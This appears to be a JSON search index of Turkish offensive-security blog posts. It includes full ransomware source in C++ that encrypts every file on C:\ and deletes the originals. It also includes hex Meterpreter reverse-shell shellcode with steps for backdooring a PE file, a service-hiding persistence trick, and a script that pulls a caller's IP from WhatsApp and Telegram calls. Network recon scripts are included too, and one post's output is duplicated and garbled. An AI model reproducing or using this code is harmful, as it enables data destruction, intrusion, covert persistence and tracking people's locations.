[
  
  {
    "title": "Whatsapp & Telegram Aramaları ile Yer / IP Öğrenmek?",
    "url": "/posts/whatsapp-telegram-aramalari-ile-yer-ip-ogrenmek/",
    "categories": "Intel",
    "tags": "Social",
    "date": "2023-09-12 00:00:00 +0300",
    





    
    "snippet": "Telegram ve Whatsapp üzerinden yapılan aramaların ipv4 katmanında XOR-RELAYED-ADDRESS üzerinden client’ın bağlandığı IP ve port bilgisini barındırır. Bunu tespit edebilmek için kişinin çağrıya yanı...",
    "content": "Telegram ve Whatsapp üzerinden yapılan aramaların ipv4 katmanında XOR-RELAYED-ADDRESS üzerinden client’ın bağlandığı IP ve port bilgisini barındırır. Bunu tespit edebilmek için kişinin çağrıya yanıt vermesi yeterlidir. Aramayı yapan kişi, arama yapmadan önce trafiğini dinler ve trafik içeriğinde aradığı kişinin public IP adresini tespit eder. Bu sayede yaklaşık konum elde edilebilir.Çağrı ile birlikte network trafiği dinlenir. Elde edilen trafik incelenerek IP adresi tespit edilir.#!/bin/bashtshark -F pcap -w test.pcap&amp;echo 'call whatsapp or telegram'my_ip=$(curl -s api.ipify.org)echo \"Your Public IP: $my_ip\"tshark -r test.pcap -V | grep -E \"([0-9]{1,3}[\\.]){3}[0-9]{1,3}\" | grep \"Destination\\|XOR\" | awk '{print $3}' | sort -n | uniq | grep -v $my_ip  call2ip.sh"
  },
  
  {
    "title": "Malware Development 1: Ransomware Algoritması",
    "url": "/posts/malware-development-1-ransomware-algoritmasi/",
    "categories": "Dev, Malware",
    "tags": "PE",
    "date": "2023-09-11 00:00:00 +0300",
    





    
    "snippet": "      C diskinde bulunan tüm dosyalar recursive olarak taratılır.    Elde edilen dosya ve dizinler, belirlenen encryption key ile XOR algoritması kullanılarak şifrelenir.    Encryption sonucunda or...",
    "content": "      C diskinde bulunan tüm dosyalar recursive olarak taratılır.    Elde edilen dosya ve dizinler, belirlenen encryption key ile XOR algoritması kullanılarak şifrelenir.    Encryption sonucunda orjinal dosyalar silinir.    Tekrar çalıştırılması durumunda mevcut encrypted veriler üzerinde değişiklik yapılmaz. Yeni dosya eklenmişse 1. adıma dönülür.    Bu proje de diğerleri gibi tamamen eğitim amaçlıdır. Hani educational purposes only geyiği.  Bu işlemin başarı ile gerçekleşebilmesi için sistem haklarının yükseltilmesi gerekebilir ki gerekecektir. Ancak mevcut yetkiler ile, kullanıcının erişebildiği dosyalar şifrelenir. Komple sistemi encrypted etmek için NT AUTHORITIY/SYSTEM olmak gerekir.#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;windows.h&gt;void enc(const std::string&amp; inputFile, const std::string&amp; key) {    size_t extensionPos = inputFile.find_last_of(\".\");    if (extensionPos != std::string::npos) {        std::string extension = inputFile.substr(extensionPos);        if (extension == \".1337\") {            return;        }    }    std::ifstream input(inputFile, std::ios::binary);    size_t lastDot = inputFile.find_last_of(\".\");    std::string outputFileName = inputFile.substr(0, lastDot) + \".1337\";    std::ofstream output(outputFileName, std::ios::binary);    char byte;    size_t keyIndex = 0;    while (input.get(byte)) {        byte ^= key[keyIndex];        output.put(byte);        keyIndex = (keyIndex + 1) % key.length();    }    input.close();    output.close();    remove(inputFile.c_str());}void tree(const std::string&amp; directory, const std::string&amp; xorKey) {    WIN32_FIND_DATA findFileData;    HANDLE hFind = FindFirstFile((directory + \"\\\\*\").c_str(), &amp;findFileData);    if (hFind != INVALID_HANDLE_VALUE) {        do {            if (!(findFileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)) {                std::string filePath = directory + \"\\\\\" + findFileData.cFileName;                enc(filePath, xorKey);            } else if (strcmp(findFileData.cFileName, \".\") != 0 &amp;&amp; strcmp(findFileData.cFileName, \"..\") != 0) {                std::string subDirectory = directory + \"\\\\\" + findFileData.cFileName;                tree(subDirectory, xorKey);            }        } while (FindNextFile(hFind, &amp;findFileData) != 0);        FindClose(hFind);    }}int main() {    const std::string drive = \"C:\\\\\";    const std::string key = \"ZEDELEYICI\";    tree(drive, key);    std::cout &lt;&lt; \"Evil within.\" &lt;&lt; std::endl;    return 0;}  malware.cpp"
  },
  
  {
    "title": "Promiscuity Detection /w ICMP & Scapy",
    "url": "/posts/promiscuity-detection-w-arp-scapy/",
    "categories": "internal, mitigate, recon, Dev",
    "tags": "ARP, non-user",
    "date": "2023-08-26 00:00:00 +0300",
    





    
    "snippet": "Yerel ağda network adaptörünü promisc modda olan cihazları tespit eder, yani biri dümdüz bir şeyler kaçırıyor mu ona bakacağız.  Interface promisc modda iken, broadcast paketlerine benzer HW adresl...",
    "content": "Yerel ağda network adaptörünü promisc modda olan cihazları tespit eder, yani biri dümdüz bir şeyler kaçırıyor mu ona bakacağız.  Interface promisc modda iken, broadcast paketlerine benzer HW adreslerini kabul eder. Bu tamamen kernel ile ilgili bir durumdur. Windows için bu adres FF:FF:00:00:00:00 iken, Linux için ise FF:FF:FF:FF:FF:FE olmaktadır.from scapy.all import *blocks = [\"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\"]for i in blocks:\tans,unans=srp(Ether(dst=\"FF:FF:FF:FF:FF:FE\")/IP(dst=i)/ICMP(), timeout=2, retry=2)\tfor snd,rcv in ans:\t\tprint(rcv.sprintf(r\"Promisc Host: %Ether.src% / %IP.src%\"))empire➜  Python  ᐅ  python3 promiscuity.pyWARNING: No IPv4 address found on anpi1 !WARNING: No IPv4 address found on anpi0 !WARNING: more No IPv4 address found on en3 !Promisc Host: b8:14:44:ea:54:26 / 192.168.1.1Promisc Host: 09:2c:29:11:90:f4 / 192.168.1.21"
  },
  
  {
    "title": "Layer 2 Recon /w ARP & Scapy",
    "url": "/posts/layer-2-recon-w-scapy/",
    "categories": "internal, Dev, recon",
    "tags": "ARP, Layer2",
    "date": "2023-08-26 00:00:00 +0300",
    





    
    "snippet": "Yerel ağda Private IP Blokları üzerinden tarama yapılır masscan, nmap, hping vb işi uzatır. Bunların yerine scapy ile package craft edip networke salacağız.  24-bit block\t10.0.0.0 – 10.255.255.255\t...",
    "content": "Yerel ağda Private IP Blokları üzerinden tarama yapılır masscan, nmap, hping vb işi uzatır. Bunların yerine scapy ile package craft edip networke salacağız.  24-bit block\t10.0.0.0 – 10.255.255.255\t10.0.0.0/8 (255.0.0.0)  20-bit block\t172.16.0.0 – 172.31.255.255\t172.16.0.0/12 (255.240.0.0)  16-bit block\t192.168.0.0 – 192.168.255.255\t192.168.0.0/16 (255.255.0.0)  ARP Broadcast HW adresi olarak FF:FF:FF:FF:FF:FF kullanılacakfrom scapy.all import *import sysblocks = [\"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\"]for i in blocks:\tans, nans = srp(Ether(dst=\"FF:FF:FF:FF:FF:FF\") / ARP(pdst=i),timeout=2,retry=10,verbose=False)\tfor snd,rcv in ans:\t\tprint(rcv.sprintf(r\"Alive Host: %Ether.src% / %ARP.psrc%\"))empire➜  Python  ᐅ  python3 recon.pyWARNING: No IPv4 address found on anpi1 !WARNING: No IPv4 address found on anpi0 !WARNING: more No IPv4 address found on en3 !Alive Host: a8:32:1f:ea:44:36 / 192.168.1.1Alive Host: 01:a0:3e:81:7a:12 / 192.168.1.4Alive Host: 02:0g:29:61:9a:d4 / 192.168.1.19Alive Host: 06:0f:29:69:22:2d / 192.168.1.20"
  },
  
  {
    "title": "SDDL ? Soc Analistin Kâbusu",
    "url": "/posts/ssdl-soc-analistin-kabusu/",
    "categories": "persistence, attacks",
    "tags": "movement",
    "date": "2023-08-25 00:00:00 +0300",
    





    
    "snippet": "Security Descriptor Definition Language Kabaca SCM ile (Service Control Manager) sistem üzerinde Service oluşturmayı ve oluşturulan servisler üzerinde işlemler yapılabiliyor. Genel anlatım servis o...",
    "content": "Security Descriptor Definition Language Kabaca SCM ile (Service Control Manager) sistem üzerinde Service oluşturmayı ve oluşturulan servisler üzerinde işlemler yapılabiliyor. Genel anlatım servis oluşturup launch etmek üzerine ancak burada mevcut servisi gizlemek üzerine kullanacağız.  SDDL Everyone olarak yetkilendirilmeli.C:\\Users\\test\\Desktop\\sc create kotu_isler start=auto binpath=%[SC] CreateService SUCCESSC:\\Users\\test\\Desktop&gt;sc sdset kotu_isler \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"[SC] SetServiceObjectSecurity SUCCESSC:\\Users\\test\\Desktop&gt;sc queryex type=service state=all | find /i \"SERVICE_NAME:\"SERVICE_NAME: AJRouterSERVICE_NAME: ALGSERVICE_NAME: AppIDSvcSERVICE_NAME: AppinfoSERVICE_NAME: AppMgmtSERVICE_NAME: AppReadinessSERVICE_NAME: AppXSvcSERVICE_NAME: AssignedAccessManagerSvcSERVICE_NAME: AudioEndpointBuilderSERVICE_NAME: AudiosrvSERVICE_NAME: autotimesvcSERVICE_NAME: AxInstSVSERVICE_NAME: BDESVCSERVICE_NAME: BFESERVICE_NAME: BITSSERVICE_NAME: BrokerInfrastructureSERVICE_NAME: BTAGServiceSERVICE_NAME: BthAvctpSvcSERVICE_NAME: bthservSERVICE_NAME: camsvcSERVICE_NAME: CDPSvcSERVICE_NAME: CertPropSvcSERVICE_NAME: ClipSVCSERVICE_NAME: cloudidsvcSERVICE_NAME: COMSysAppSERVICE_NAME: CoreMessagingRegistrarSERVICE_NAME: CryptSvcSERVICE_NAME: CscServiceSERVICE_NAME: DcomLaunchSERVICE_NAME: dcsvcSERVICE_NAME: defragsvcSERVICE_NAME: DeviceAssociationServiceSERVICE_NAME: DeviceInstallSERVICE_NAME: DevQueryBrokerSERVICE_NAME: DhcpSERVICE_NAME: diagnosticshub.standardcollector.serviceSERVICE_NAME: diagsvcSERVICE_NAME: DiagTrackSERVICE_NAME: DialogBlockingServiceSERVICE_NAME: DispBrokerDesktopSvcSERVICE_NAME: DisplayEnhancementServiceSERVICE_NAME: DmEnrollmentSvcSERVICE_NAME: dmwappushserviceSERVICE_NAME: DnscacheSERVICE_NAME: DoSvcSERVICE_NAME: dot3svcSERVICE_NAME: DPSSERVICE_NAME: DsmSvcSERVICE_NAME: DsSvcSERVICE_NAME: DusmSvcSERVICE_NAME: EapHostSERVICE_NAME: edgeupdateSERVICE_NAME: edgeupdatemSERVICE_NAME: EFSSERVICE_NAME: embeddedmodeSERVICE_NAME: EntAppSvcSERVICE_NAME: EventLogSERVICE_NAME: EventSystemSERVICE_NAME: fdPHostSERVICE_NAME: FDResPubSERVICE_NAME: FontCacheSERVICE_NAME: FrameServerSERVICE_NAME: FrameServerMonitorSERVICE_NAME: gpsvcSERVICE_NAME: GraphicsPerfSvcSERVICE_NAME: hidservSERVICE_NAME: HvHostSERVICE_NAME: icssvcSERVICE_NAME: IKEEXTSERVICE_NAME: InstallServiceSERVICE_NAME: InventorySvcSERVICE_NAME: iphlpsvcSERVICE_NAME: IpxlatCfgSvcSERVICE_NAME: KeyIsoSERVICE_NAME: KtmRmSERVICE_NAME: LanmanServerSERVICE_NAME: LanmanWorkstationSERVICE_NAME: lfsvcSERVICE_NAME: LicenseManagerSERVICE_NAME: lltdsvcSERVICE_NAME: lmhostsSERVICE_NAME: LSMSERVICE_NAME: LxpSvcSERVICE_NAME: MapsBrokerSERVICE_NAME: McpManagementServiceSERVICE_NAME: MicrosoftEdgeElevationServiceSERVICE_NAME: mpssvcSERVICE_NAME: MSDTCSERVICE_NAME: msiserverSERVICE_NAME: MsKeyboardFilterSERVICE_NAME: NaturalAuthenticationSERVICE_NAME: NcaSvcSERVICE_NAME: NcbServiceSERVICE_NAME: NcdAutoSetupSERVICE_NAME: NetlogonSERVICE_NAME: NetmanSERVICE_NAME: netprofmSERVICE_NAME: NetSetupSvcSERVICE_NAME: NetTcpPortSharingSERVICE_NAME: NgcCtnrSvcSERVICE_NAME: NgcSvcSERVICE_NAME: NlaSvcSERVICE_NAME: nsiSERVICE_NAME: p2pimsvcSERVICE_NAME: p2psvcSERVICE_NAME: PcaSvcSERVICE_NAME: PeerDistSvcSERVICE_NAME: PerfHostSERVICE_NAME: PhoneSvcSERVICE_NAME: plaSERVICE_NAME: PNRPAutoRegSERVICE_NAME: PNRPsvcSERVICE_NAME: PolicyAgentSERVICE_NAME: PowerSERVICE_NAME: ProfSvcSERVICE_NAME: PushToInstallSERVICE_NAME: QWAVESERVICE_NAME: RasAutoSERVICE_NAME: RasManSERVICE_NAME: RemoteAccessSERVICE_NAME: RemoteRegistrySERVICE_NAME: RetailDemoSERVICE_NAME: RmSvcSERVICE_NAME: RpcEptMapperSERVICE_NAME: RpcLocatorSERVICE_NAME: RpcSsSERVICE_NAME: SamSsSERVICE_NAME: SCardSvrSERVICE_NAME: ScDeviceEnumSERVICE_NAME: ScheduleSERVICE_NAME: SCPolicySvcSERVICE_NAME: SDRSVCSERVICE_NAME: seclogonSERVICE_NAME: SecurityHealthServiceSERVICE_NAME: SEMgrSvcSERVICE_NAME: SENSSERVICE_NAME: SenseSERVICE_NAME: SensorDataServiceSERVICE_NAME: SensorServiceSERVICE_NAME: SensrSvcSERVICE_NAME: SessionEnvSERVICE_NAME: SharedAccessSERVICE_NAME: SharedRealitySvcSERVICE_NAME: ShellHWDetectionSERVICE_NAME: shpamsvcSERVICE_NAME: smphostSERVICE_NAME: SmsRouterSERVICE_NAME: SNMPTrapSERVICE_NAME: spectrumSERVICE_NAME: SpoolerSERVICE_NAME: sppsvcSERVICE_NAME: SSDPSRVSERVICE_NAME: ssh-agentSERVICE_NAME: SstpSvcSERVICE_NAME: StateRepositorySERVICE_NAME: StiSvcSERVICE_NAME: StorSvcSERVICE_NAME: svsvcSERVICE_NAME: swprvSERVICE_NAME: SysMainSERVICE_NAME: SystemEventsBrokerSERVICE_NAME: TapiSrvSERVICE_NAME: TermServiceSERVICE_NAME: TextInputManagementServiceSERVICE_NAME: ThemesSERVICE_NAME: TieringEngineServiceSERVICE_NAME: TimeBrokerSvcSERVICE_NAME: TokenBrokerSERVICE_NAME: TrkWksSERVICE_NAME: TroubleshootingSvcSERVICE_NAME: TrustedInstallerSERVICE_NAME: tzautoupdateSERVICE_NAME: UmRdpServiceSERVICE_NAME: upnphostSERVICE_NAME: UserManagerSERVICE_NAME: UsoSvcSERVICE_NAME: VacSvcSERVICE_NAME: VaultSvcSERVICE_NAME: vdsSERVICE_NAME: vmicguestinterfaceSERVICE_NAME: vmicheartbeatSERVICE_NAME: vmickvpexchangeSERVICE_NAME: vmicshutdownSERVICE_NAME: vmictimesyncSERVICE_NAME: vmicvmsessionSERVICE_NAME: vmicvssSERVICE_NAME: VSSSERVICE_NAME: W32TimeSERVICE_NAME: WaaSMedicSvcSERVICE_NAME: WalletServiceSERVICE_NAME: WarpJITSvcSERVICE_NAME: wbengineSERVICE_NAME: WbioSrvcSERVICE_NAME: WcmsvcSERVICE_NAME: wcncsvcSERVICE_NAME: WdiServiceHostSERVICE_NAME: WdiSystemHostSERVICE_NAME: WdNisSvcSERVICE_NAME: WebClientSERVICE_NAME: webthreatdefsvcSERVICE_NAME: WecsvcSERVICE_NAME: WEPHOSTSVCSERVICE_NAME: wercplsupportSERVICE_NAME: WerSvcSERVICE_NAME: WFDSConMgrSvcSERVICE_NAME: WiaRpcSERVICE_NAME: WinDefendSERVICE_NAME: WinHttpAutoProxySvcSERVICE_NAME: winmgmtSERVICE_NAME: WinRMSERVICE_NAME: wisvcSERVICE_NAME: WlanSvcSERVICE_NAME: wlidsvcSERVICE_NAME: wlpasvcSERVICE_NAME: WManSvcSERVICE_NAME: wmiApSrvSERVICE_NAME: WMPNetworkSvcSERVICE_NAME: workfolderssvcSERVICE_NAME: WpcMonSvcSERVICE_NAME: WPDBusEnumSERVICE_NAME: WpnServiceSERVICE_NAME: wscsvcSERVICE_NAME: WSearchSERVICE_NAME: wuauservSERVICE_NAME: WwanSvcSERVICE_NAME: XblAuthManagerSERVICE_NAME: XblGameSaveSERVICE_NAME: XboxGipSvcSERVICE_NAME: XboxNetApiSvcSERVICE_NAME: XtaCacheSERVICE_NAME: PrintNotifySERVICE_NAME: AarSvc_18200dSERVICE_NAME: BcastDVRUserService_18200dSERVICE_NAME: BluetoothUserService_18200dSERVICE_NAME: CaptureService_18200dSERVICE_NAME: cbdhsvc_18200dSERVICE_NAME: CDPUserSvc_18200dSERVICE_NAME: ConsentUxUserSvc_18200dSERVICE_NAME: CredentialEnrollmentManagerUserSvc_18200dSERVICE_NAME: DeviceAssociationBrokerSvc_18200dSERVICE_NAME: DevicePickerUserSvc_18200dSERVICE_NAME: DevicesFlowUserSvc_18200dSERVICE_NAME: MessagingService_18200dSERVICE_NAME: NPSMSvc_18200dSERVICE_NAME: OneSyncSvc_18200dSERVICE_NAME: P9RdrService_18200dSERVICE_NAME: PenService_18200dSERVICE_NAME: PimIndexMaintenanceSvc_18200dSERVICE_NAME: PrintWorkflowUserSvc_18200dSERVICE_NAME: UdkUserSvc_18200dSERVICE_NAME: UnistoreSvc_18200dSERVICE_NAME: UserDataSvc_18200dSERVICE_NAME: webthreatdefusersvc_18200dSERVICE_NAME: WpnUserService_18200d%ieringEngineServiceSERVICE_NAME: TimeBrokerSvcSERVICE_NAME: TokenBrokerSERVICE_NAME: TrkWksSERVICE_NAME: TroubleshootingSvcSERVICE_NAME: TrustedInstallerSERVICE_NAME: tzautoupdateSERVICE_NAME: UmRdpServiceSERVICE_NAME: upnphostSERVICE_NAME: UserManagerSERVICE_NAME: UsoSvcSERVICE_NAME: VacSvcSERVICE_NAME: VaultSvcSERVICE_NAME: vdsSERVICE_NAME: vmicguestinterfaceSERVICE_NAME: vmicheartbeatSERVICE_NAME: vmickvpexchangeSERVICE_NAME: vmicshutdownSERVICE_NAME: vmictimesyncSERVICE_NAME: vmicvmsessionSERVICE_NAME: vmicvssSERVICE_NAME: VSSSERVICE_NAME: W32TimeSERVICE_NAME: WaaSMedicSvcSERVICE_NAME: WalletServiceSERVICE_NAME: WarpJITSvcSERVICE_NAME: wbengineSERVICE_NAME: WbioSrvcSERVICE_NAME: WcmsvcSERVICE_NAME: wcncsvcSERVICE_NAME: WdiServiceHostSERVICE_NAME: WdiSystemHostSERVICE_NAME: WdNisSvcSERVICE_NAME: WebClientSERVICE_NAME: webthreatdefsvcSERVICE_NAME: WecsvcSERVICE_NAME: WEPHOSTSVCSERVICE_NAME: wercplsupportSERVICE_NAME: WerSvcSERVICE_NAME: WFDSConMgrSvcSERVICE_NAME: WiaRpcSERVICE_NAME: WinDefendSERVICE_NAME: WinHttpAutoProxySvcSERVICE_NAME: winmgmtSERVICE_NAME: WinRMSERVICE_NAME: wisvcSERVICE_NAME: WlanSvcSERVICE_NAME: wlidsvcSERVICE_NAME: wlpasvcSERVICE_NAME: WManSvcSERVICE_NAME: wmiApSrvSERVICE_NAME: WMPNetworkSvcSERVICE_NAME: workfolderssvcSERVICE_NAME: WpcMonSvcSERVICE_NAME: WPDBusEnumSERVICE_NAME: WpnServiceSERVICE_NAME: wscsvcSERVICE_NAME: WSearchSERVICE_NAME: wuauservSERVICE_NAME: WwanSvcSERVICE_NAME: XblAuthManagerSERVICE_NAME: XblGameSaveSERVICE_NAME: XboxGipSvcSERVICE_NAME: XboxNetApiSvcSERVICE_NAME: XtaCacheSERVICE_NAME: PrintNotifySERVICE_NAME: AarSvc_18200dSERVICE_NAME: BcastDVRUserService_18200dSERVICE_NAME: BluetoothUserService_18200dSERVICE_NAME: CaptureService_18200dSERVICE_NAME: cbdhsvc_18200dSERVICE_NAME: CDPUserSvc_18200dSERVICE_NAME: ConsentUxUserSvc_18200dSERVICE_NAME: CredentialEnrollmentManagerUserSvc_18200dSERVICE_NAME: DeviceAssociationBrokerSvc_18200dSERVICE_NAME: DevicePickerUserSvc_18200dSERVICE_NAME: DevicesFlowUserSvc_18200dSERVICE_NAME: MessagingService_18200dSERVICE_NAME: NPSMSvc_18200dSERVICE_NAME: OneSyncSvc_18200dSERVICE_NAME: P9RdrService_18200dSERVICE_NAME: PenService_18200dSERVICE_NAME: PimIndexMaintenanceSvc_18200dSERVICE_NAME: PrintWorkflowUserSvc_18200dSERVICE_NAME: UdkUserSvc_18200dSERVICE_NAME: UnistoreSvc_18200dSERVICE_NAME: UserDataSvc_18200dSERVICE_NAME: webthreatdefusersvc_18200dSERVICE_NAME: WpnUserService_18200d%"
  },
  
  {
    "title": "Directory Scanner Nuclei Template",
    "url": "/posts/directory-scanner-nuclei-template/",
    "categories": "Dev, Web",
    "tags": "nuclei, fuzzing",
    "date": "2023-08-24 00:00:00 +0300",
    





    
    "snippet": "Dirbuster, ffuf veya diğer dizin tarama araçlarının yaptığı işin aynısı olacak. Tek fark nuclei yapısı altında yaml dosyası ve wordlist kullanarak yapacağız. Hah bir de recursive degil su an  Wordl...",
    "content": "Dirbuster, ffuf veya diğer dizin tarama araçlarının yaptığı işin aynısı olacak. Tek fark nuclei yapısı altında yaml dosyası ve wordlist kullanarak yapacağız. Hah bir de recursive degil su an  Wordlist için Seclist kullanılabilir.id: DirectoryScanner # yaml IDinfo:  name: Directory Scanner   author: Yugen  severity: low # sonuclarin onem derecesirequests:  - method: GET    path:      - \"/\"     payloads:        fuzz: Wordlists/SecLists/Discovery/Web-Content/big.txt # wordlistin yolu    threads: 50 # tek seferde 50 request    matchers:      - type: status # status 301,200 veya 403 donerse low severity de ekrana sonucu bas        status:          - 301          - 200          - 403empire➜  nuclei  ᐅ  nuclei -t directory-scanner.yaml -u localhost  -silent[DirectoryScanner] [http] [low] http://localhost/.profile [fuzz=\".profile\"][DirectoryScanner] [http] [low] http://localhost/.ssh [fuzz=\".ssh\"][DirectoryScanner] [http] [low] http://localhost/.bash_history [fuzz=\".bash_history\"][DirectoryScanner] [http] [low] http://localhost/Music [fuzz=\"Music\"][DirectoryScanner] [http] [low] http://localhost/Research [fuzz=\"Research\"][DirectoryScanner] [http] [low] http://localhost/app [fuzz=\"app\"][DirectoryScanner] [http] [low] http://localhost/applications [fuzz=\"applications\"][DirectoryScanner] [http] [low] http://localhost/certs [fuzz=\"certs\"]"
  },
  
  {
    "title": "Backdooring",
    "url": "/posts/backdooring/",
    "categories": "persistence",
    "tags": "execution, reverse, PE, movement",
    "date": "2023-07-14 00:00:00 +0300",
    





    
    "snippet": "ASLR ve DEP korumalarının kapalı olması durumunda stack e shellcode yüklenip çalıştırılabilir.  ASLR, uygulamaların fonksiyon adreslerinin rastgele belirlenmesini ve bu rastgeleliğin sürekli devam ...",
    "content": "ASLR ve DEP korumalarının kapalı olması durumunda stack e shellcode yüklenip çalıştırılabilir.  ASLR, uygulamaların fonksiyon adreslerinin rastgele belirlenmesini ve bu rastgeleliğin sürekli devam etmesini sağlayan izolasyon mekanizmasıdır.  DEP,  stack üzerine veri yazılmasını/çalıştırılmasını engelleyen mekanizma.ASLR ve DEP korumalarının devre dışı olması durumunda genel olarak 2 şekilde stack e veri yazılabilir.  Overflow-based zafiyetler  Uygulamaya ayrılan memory alanının taşması sonucunda program hafızasına müdahale ederek stack verisi ile oynayıp/değiştirip/çalıştırabilmek  PE Section ile backdooring işlemi  PE dosyalarında bulunan sectionlar paylaşılır ve oluşturulabilir. Yeni bir PE section oluşturularak bu alanın içeriğine zararlı shellcode yazılır. Kod akışı eklenen PE section adresine yönlendirilir ve dolaylı yoldan stack üzerinde işlem yapılabilir.1337@empire:~$ msfvenom --arch x86 --platform windows --payload windows/meterpreter/reverse_tcp LHOST=192.168.1.40 LPORT=9999 -f hexNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of hex file: 708 bytesfce88f0000006031d2648b52308b520c89e58b521431ff8b72280fb74a2631c0ac3c617c022c20c1cf0d01c74975ef528b5210578b423c01d08b407885c0744c01d08b58208b481801d35085c9743c498b348b31ff01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d6833320000687773325f54684c77260789e8ffd0b89001000029c454506829806b00ffd56a0a68c0a80128680200270f89e6505050504050405068ea0fdfe0ffd5976a1056576899a57461ffd585c0740aff4e0875ece8670000006a006a0456576802d9c85fffd583f8007e368b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd583f8007d285868004000006a0050680b2f0f30ffd55768756e4d61ffd55e5eff0c240f8570ffffffe99bffffff01c329c675c1c3bbf0b5a2566a0053ffd5Oluşturulan shellcode 708 byte Burası önemli çünkü ileride RWX yetkili bir PE section header oluşturulacak ve bu header boyutu &lt; 708 byte olmamalı  İndirilen dosya PE Bear içerisinde açılır. Sections &gt; Add a new section ile yeni section için isim ve RWX yetkiler tanımlanır.  section isimleri . ile başlamalı  Virtual ve Raw size, girilecek shellcode boyutundan büyük olmalı  Oluşturulan sectionlar kaydedilirx64dbg içinde PE Bear ile kaydedilen uygulama açılır  Uygulama içerisinde Hafıza sekmesinde oluşturulan section görülmekte. Burada önemli olan bu section un Adresi. Bu adres içeriği doldurulacak ve kod akışı bu adrese yönlendirilecek.  .garabet section adresi kopyalanır  Uygulama görseldeki gibi başlatılır. Uygulamanın entry point adresinde otomatik oluşturulan bir breakpoint vardır. Bu breakpoint adresi, uygulamanın başlayacağı adresi temsil eder.  Uygulama 0x0049E136 adresinde durmuş. Sağ tarafta ise bir sonraki satırda yapılacak işlem gösterilmiştir. Uygulama bir sonraki adımda kendi içerisinde tanımlı bir fonksiyona JMP (atlamak) üzere çalışmaktadır. JMP 0x0049E138 olan bu adresi JMP [.garabet adresi] olarak düzenleyeceğiz.  ‘SPACE’ ile assembler açılır  PE Bear ile oluşturulan section adresi girilir  EIP artık oluşturulan section adresini göstermektedir.  Program akışı section içerisine bağlandı. İçeriğine shellcode doldurulur  ilk iki satır pushfad ve pushfd olarak değiştirilir. Bu komutlar memory registerlarını (eflags) temizlemek için kullanılır. Programın buraya kadar akışında olan tüm değerler sıfırlanır.  Shellcode yapıştırılır (clipboard)  Dosya patchlenir1337@1337:~$ msfconsole                                                  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                    %%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                    %%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%                                                                                                    %%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                    %%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                    %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                    %%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                    %%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                                                                    %%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                                                                    %%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                                                                    %%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                                                                    %%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                                                                    %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                                                                    %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                                                                    %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                                                                                                                                                                                            =[ metasploit v6.3.21-dev                          ]+ -- --=[ 2327 exploits - 1218 auxiliary - 413 post       ]+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]+ -- --=[ 9 evasion                                       ]Metasploit tip: View a module's description using info, or the enhanced version in your browser with info -dMetasploit Documentation: https://docs.metasploit.com/msf6 &gt; use multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LHOST eth0LHOST =&gt; eth0msf6 exploit(multi/handler) &gt; set LPORT 9999LPORT =&gt; 9999msf6 exploit(multi/handler) &gt; exploit[*] Started reverse TCP handler on 192.168.1.40:9999 [*] Sending stage (175686 bytes) to 192.168.1.44[*] Meterpreter session 3 opened (192.168.1.40:9999 -&gt; 192.168.1.44:49224) at 2023-07-13 17:42:16 -0400meterpreter &gt; shellProcess 2008 created.Channel 1 created.Microsoft Windows [S r m 6.1.7601]Telif Hakk  (c) 2009 Microsoft Corporation. T m haklar  sakl d 